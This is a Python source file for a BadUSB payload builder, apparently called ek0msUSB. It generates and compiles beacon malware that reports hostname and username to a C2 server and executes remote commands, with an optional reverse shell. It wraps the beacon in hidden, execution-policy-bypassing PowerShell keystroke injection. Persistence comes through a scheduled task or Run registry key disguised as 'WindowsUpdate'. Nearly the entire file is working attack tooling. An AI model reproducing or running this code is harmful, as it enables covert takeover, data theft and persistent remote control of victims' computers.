#!/usr/bin/env python3
"""
ek0msUSB Payload Builder - Creates BadUSB payloads with direct beacon generation
"""

import os
import base64
import argparse
import tempfile
from pathlib import Path

class PayloadBuilder:
    def __init__(self):
        self.payload_types = {
            'in_memory': 'Reflective loading (stealthy)',
            'disk_based': 'Traditional file drop (reliable)',
            'hybrid': 'Combination approach (balanced)'
        }
        
        self.beacon_types = {
            'simple': 'Basic beacon with console (testing)',
            'stealth': 'Stealthy beacon (no console)',
            'advanced': 'Advanced beacon with command execution'
        }

    def _generate_beacon_source(self, beacon_type='simple', c2_url=None, reverse_shell=None):
        """Generate beacon Python source code directly (no external file)"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        # Reverse shell code
        rev_shell_code = ""
        if reverse_shell and reverse_shell.get('enabled'):
            rhost = reverse_shell.get('rhost')
            rport = reverse_shell.get('rport', 4444)
            
            rev_shell_code = f'''
def start_reverse_shell():
    """Security testing component"""
    import threading
    import socket
    import subprocess
    import time
    
    def reverse_shell_worker():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("{rhost}", {rport}))
                s.send(b"Security Test")
                
                while True:
                    command = s.recv(1024).decode("utf-8", errors="ignore").strip()
                    if not command:
                        break
                    if command.lower() == "exit":
                        s.close()
                        return
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        s.send(result)
                    except Exception as e:
                        s.send(f"Error: {{str(e)}}".encode())
            except Exception:
                time.sleep(30)
    
    thread = threading.Thread(target=reverse_shell_worker, daemon=True)
    thread.start()
    return thread

rev_shell_thread = start_reverse_shell()
'''
        
        if beacon_type == 'simple':
            return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
from datetime import datetime

{rev_shell_code}

def main():
    c2_url = "{c2_url}"
    while True:
        try:
            system_info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME"),
                "timestamp": datetime.now().isoformat(),
                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
            }}
            requests.post(f"{{c2_url}}/beacon", json=system_info, timeout=10)
        except:
            pass
        time.sleep(60)

if __name__ == "__main__":
    main()
'''
        
        elif beacon_type == 'stealth':
            return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time

{rev_shell_code}

def main():
    c2_url = "{c2_url}"
    while True:
        try:
            info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME"),
                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
            }}
            requests.post(f"{{c2_url}}/beacon", json=info, timeout=15)
        except:
            pass
        time.sleep(120)

if __name__ == "__main__":
    main()
'''
        
        else:  # advanced
            return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import subprocess

{rev_shell_code}

class AdvancedBeacon:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.beacon_id = platform.node() + "_" + os.getenv("USERNAME")
    
    def check_for_commands(self):
        try:
            response = requests.get(f"{{self.c2_url}}/commands/{{self.beacon_id}}", timeout=10)
            if response.status_code == 200:
                return response.json()
        except:
            return []
        return []
    
    def execute_commands(self, commands):
        for cmd in commands:
            try:
                if cmd["type"] == "shell":
                    result = subprocess.check_output(cmd["command"], shell=True, timeout=30)
                    self.report_result(cmd["id"], result.decode('utf-8', errors='ignore'))
            except:
                pass
    
    def report_result(self, cmd_id, result):
        try:
            requests.post(f"{{self.c2_url}}/results", json={{
                "beacon_id": self.beacon_id,
                "command_id": cmd_id,
                "result": result,
                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
            }})
        except:
            pass
    
    def run(self):
        while True:
            commands = self.check_for_commands()
            if commands:
                self.execute_commands(commands)
            time.sleep(60)

def main():
    beacon = AdvancedBeacon("{c2_url}")
    beacon.run()

if __name__ == "__main__":
    main()
'''

    def _compile_beacon(self, beacon_type='simple', c2_url=None, reverse_shell=None):
        """Generate and compile a beacon to EXE directly"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        # Generate Python source directly
        source_code = self._generate_beacon_source(beacon_type, c2_url, reverse_shell)
        
        # Create temporary Python file in current directory
        temp_dir = os.getcwd()
        temp_py_file = os.path.join(temp_dir, f"temp_beacon_{beacon_type}.py")
        
        try:
            with open(temp_py_file, 'w') as f:
                f.write(source_code)
            
            output_path = f"beacon_{beacon_type}.exe"
            
            # Use PyInstaller to compile
            import subprocess
            console_setting = '--console' if beacon_type == 'simple' else '--noconsole'
            
            # Try different PyInstaller commands
            commands_to_try = [
                ['pyinstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file],
                ['python', '-m', 'PyInstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file],
                ['py', '-m', 'PyInstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file]
            ]
            
            for cmd in commands_to_try:
                try:
                    print(f"[*] Trying: {' '.join(cmd)}")
                    result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir)
                    
                    if result.returncode == 0:
                        # Check for output file
                        dist_file = os.path.join('dist', output_path)
                        if os.path.exists(dist_file):
                            return dist_file
                        elif os.path.exists(output_path):
                            return output_path
                        else:
                            continue  # Try next command
                    else:
                        print(f"[-] Command failed: {result.stderr}")
                        continue
                except Exception as e:
                    print(f"[-] Command error: {e}")
                    continue
            
            raise Exception("All PyInstaller commands failed")
                
        except Exception as e:
            print(f"Compilation error: {e}")
            raise
        finally:
            # Clean up temporary file
            if os.path.exists(temp_py_file):
                try:
                    os.unlink(temp_py_file)
                except:
                    pass

    def build_badusb_script(self, beacon_type='simple', payload_type='in_memory', 
                           output_name="WindowsUpdate", c2_url=None, reverse_shell=None):
        """Build complete BadUSB DuckyScript with reverse shell option"""
        
        if not c2_url or c2_url == "YOUR_C2_SERVER_URL_HERE":
            raise ValueError("C2 URL must be specified")
        
        print(f"[*] Generating {beacon_type} beacon for C2: {c2_url}")
        if reverse_shell and reverse_shell.get('enabled'):
            print(f"[+] Reverse shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}")
        
        # Generate and compile the beacon WITH reverse shell
        beacon_exe_path = self._compile_beacon(beacon_type, c2_url, reverse_shell)
        
        if not beacon_exe_path or not os.path.exists(beacon_exe_path):
            raise Exception(f"Failed to generate beacon: {beacon_exe_path}")
        
        try:
            # Read and encode the generated beacon
            with open(beacon_exe_path, 'rb') as f:
                payload_data = f.read()
            b64_payload = base64.b64encode(payload_data).decode('utf-8')
            
            print(f"[+] Beacon generated successfully: {os.path.getsize(beacon_exe_path)} bytes")
            print(f"[+] Building {payload_type} BadUSB payload...")
            
            # Build the script based on type
            if payload_type == 'in_memory':
                return self._build_in_memory_payload(b64_payload, output_name, c2_url, reverse_shell)
            elif payload_type == 'disk_based':
                return self._build_disk_based_payload(b64_payload, output_name, c2_url, reverse_shell)
            else:
                return self._build_hybrid_payload(b64_payload, output_name, c2_url, reverse_shell)
                
        finally:
            # Clean up temporary beacon (keep dist file for debugging)
            pass

    def _build_in_memory_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
        """Build in-memory payload with C2 communication and reverse shell info"""
        
        # Split the payload into chunks to avoid DuckyScript limits
        payload_chunks = [b64_payload[i:i+2000] for i in range(0, len(b64_payload), 2000)]
        payload_var = f"${output_name}Payload"
        
        # Add reverse shell info to payload header
        reverse_shell_info = ""
        if reverse_shell and reverse_shell.get('enabled'):
            reverse_shell_info = f"\n# Reverse Shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}"
        
        script = f'''# ek0msUSB In-Memory Payload WITH C2{reverse_shell_info}
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}
# WARNING: For authorized testing only

DELAY 3000
REM -- Attempt multiple execution methods
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Invoke-MemoryLoad {{
STRING     param([string]`$B64Data)
STRING     `$bytes = [Convert]::FromBase64String(`$B64Data)
STRING     `$assem = [System.Reflection.Assembly]::Load(`$bytes)
STRING     `$entry = `$assem.EntryPoint
STRING     if (`$entry.GetParameters().Length -eq 0) {{
STRING         `$entry.Invoke(`$null, @())
STRING     }} else {{
STRING         `$entry.Invoke(`$null, @(,[string[]]@()))
STRING     }}
STRING }}
STRING 
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING             domain = `$env:USERDOMAIN
STRING             os = (Get-WmiObject Win32_OperatingSystem).Caption
STRING         }} | ConvertTo-Json
STRING         
STRING         `$response = Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing
STRING         return `$response.Content
STRING     }} catch {{ return `$null }}
STRING }}
STRING 
STRING # Build payload from chunks
STRING {payload_var} = '{payload_chunks[0]}'
'''
        
        # Add remaining payload chunks
        for i, chunk in enumerate(payload_chunks[1:], 1):
            script += f"STRING {payload_var} += '{chunk}'\n"
        
        script += f'''
STRING # Persistence setup with C2 beaconing
STRING `$loaderPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.ps1\"
STRING `$loaderContent = @\"
STRING function Invoke-MemoryLoad {{ param([string]`$B64Data) `$bytes = [Convert]::FromBase64String(`$B64Data); `$assem = [System.Reflection.Assembly]::Load(`$bytes); `$entry = `$assem.EntryPoint; if (`$entry.GetParameters().Length -eq 0) {{ `$entry.Invoke(`$null, @()) }} else {{ `$entry.Invoke(`$null, @(,[string[]]@())) }} }}
STRING function Send-Beacon {{ param([string]`$C2Url) try {{ `$systemInfo = @{{ hostname = `$env:COMPUTERNAME; username = `$env:USERNAME }} | ConvertTo-Json; `$response = Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing; return `$response.Content }} catch {{ return `$null }} }}
STRING Invoke-MemoryLoad -B64Data '{b64_payload}'
STRING Start-Sleep 10
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING \"@
STRING Set-Content -Path `$loaderPath -Value `$loaderContent -Force
STRING 
STRING # Scheduled task for persistence
STRING `$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-WindowStyle Hidden -File `\"`$loaderPath`\"\"
STRING `$trigger = New-ScheduledTaskTrigger -AtLogOn
STRING `$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
STRING Register-ScheduledTask -TaskName \"{output_name}Manager\" -Action `$action -Trigger `$trigger -Settings `$settings -Force | Out-Null
STRING 
STRING # Execute now and send initial beacon
STRING Invoke-MemoryLoad -B64Data {payload_var}
STRING Start-Sleep 5
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING "
ENTER
'''
        return script

    def _build_disk_based_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
        """Build traditional disk-based payload with C2 and reverse shell info"""
        
        # Add reverse shell info to payload header
        reverse_shell_info = ""
        if reverse_shell and reverse_shell.get('enabled'):
            reverse_shell_info = f"\n# Reverse Shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}"
        
        return f'''# ek0msUSB Disk-Based Payload WITH C2{reverse_shell_info}
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}

DELAY 3000
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING             domain = `$env:USERDOMAIN
STRING         }} | ConvertTo-Json
STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
STRING     }} catch {{ }}
STRING }}
STRING 
STRING `$payload = '{b64_payload}'
STRING `$path = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.exe\"
STRING `$bytes = [Convert]::FromBase64String(`$payload)
STRING [IO.File]::WriteAllBytes(`$path, `$bytes)
STRING 
STRING # Add to startup
STRING reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"{output_name}\" /t REG_SZ /d `$path /f
STRING 
STRING # Execute and beacon
STRING Start-Process -FilePath `$path -WindowStyle Hidden
STRING Start-Sleep 10
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING "
ENTER
'''

    def _build_hybrid_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
        """Build hybrid payload (in-memory execution with disk backup and C2) with reverse shell info"""
        return self._build_in_memory_payload(b64_payload, output_name, c2_url, reverse_shell)

# Test function
def test_builder():
    """Test the payload builder with generated beacon and reverse shell"""
    builder = PayloadBuilder()
    
    try:
        # Test without reverse shell
        print("Testing without reverse shell...")
        script = builder.build_badusb_script('simple', 'in_memory', c2_url="http://localhost:5000")
        print("Payload built successfully!")
        
        # Test with reverse shell
        print("\nTesting WITH reverse shell...")
        reverse_config = {
            'enabled': True,
            'rhost': '192.168.1.100', 
            'rport': 4444
        }
        script_with_rev = builder.build_badusb_script('simple', 'in_memory', c2_url="http://localhost:5000", reverse_shell=reverse_config)
        print("Payload with reverse shell built successfully!")
        
        return script_with_rev
    except Exception as e:
        print(f"Error building payload: {e}")
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ek0msUSB Payload Builder')
    parser.add_argument('--test', action='store_true', help='Run test')
    parser.add_argument('--beacon-type', choices=['simple', 'stealth', 'advanced'], default='simple', help='Beacon type to generate')
    parser.add_argument('--payload-type', choices=['in_memory', 'disk_based', 'hybrid'], default='in_memory', help='Delivery method')
    parser.add_argument('--output-name', default='WindowsUpdate', help='Output name for persistence')
    parser.add_argument('--c2-url', required=True, help='C2 server URL')
    parser.add_argument('--reverse-shell-host', help='Reverse shell host (IP/hostname)')
    parser.add_argument('--reverse-shell-port', type=int, default=4444, help='Reverse shell port (default: 4444)')
    parser.add_argument('--output-file', default='payload.txt', help='Output DuckyScript file')
    
    args = parser.parse_args()
    
    if args.test:
        test_builder()
    else:
        builder = PayloadBuilder()
        
        # Build reverse shell config if provided
        reverse_shell_config = None
        if args.reverse_shell_host:
            reverse_shell_config = {
                'enabled': True,
                'rhost': args.reverse_shell_host,
                'rport': args.reverse_shell_port
            }
            print(f"[*] Reverse shell enabled: {args.reverse_shell_host}:{args.reverse_shell_port}")
        
        try:
            script = builder.build_badusb_script(
                args.beacon_type, 
                args.payload_type, 
                args.output_name, 
                args.c2_url,
                reverse_shell_config
            )
            with open(args.output_file, 'w') as f:
                f.write(script)
            print(f"[+] Payload built: {args.output_file}")
            print(f"[+] Beacon Type: {args.beacon_type}")
            print(f"[+] Delivery Method: {args.payload_type}")
            print(f"[+] C2 URL: {args.c2_url}")
            if reverse_shell_config:
                print(f"[+] Reverse Shell: {args.reverse_shell_host}:{args.reverse_shell_port}")
        except Exception as e:
            print(f"[-] Error: {e}")